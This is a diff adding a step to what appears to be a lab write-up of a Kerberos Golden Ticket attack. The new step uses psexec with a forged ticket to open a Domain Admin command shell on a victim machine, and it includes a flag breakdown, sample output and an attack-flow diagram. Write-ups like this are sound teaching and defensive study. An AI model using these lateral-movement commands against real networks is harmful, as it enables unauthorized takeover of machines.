@@ -266,3 +266,50 @@ dir \\192.168.5.142\c$
 ### What This Proves
 
 If this command returns the contents of the C drive, it means the Golden Ticket worked. I am accessing another machine in the domain as Domain Administrator — without ever using a real password. Just the forged ticket was enough to get in.
+
+## Step -8 Getting a Shell on the Victim Machine
+
+```cmd
+psexec \\192.168.5.142 cmd.exe
+```
+
+### Flag Breakdown
+
+| Part | Description |
+|------|-------------|
+| `psexec` | Sysinternals tool that runs commands remotely on other machines |
+| `\\192.168.5.142` | IP address of the target victim machine |
+| `cmd.exe` | Opens a CMD shell on that machine |
+
+
+After the Golden Ticket was loaded into my session, I used PSExec to get a full interactive CMD shell on the victim machine at `192.168.5.142` — no password, no credentials, just the forged ticket doing all the work.
+
+**Output:**
+```
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Microsoft Windows [Version 10.0.19045.6456]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+<p align="center">
+  <img src="/writeups/golden ticket/images/step8.png" width="600">
+</p>
+
+
+### What This Proves
+
+```
+Golden Ticket injected into session
+          ↓
+Used ticket to authenticate to victim machine
+          ↓
+Got a full CMD shell as Domain Admin
+          ↓
+Complete control over the victim machine
+```
+
+This is the final proof that the Golden Ticket attack worked from end to end — I moved from the Domain Controller all the way into a victim machine using nothing but a forged Kerberos ticket.
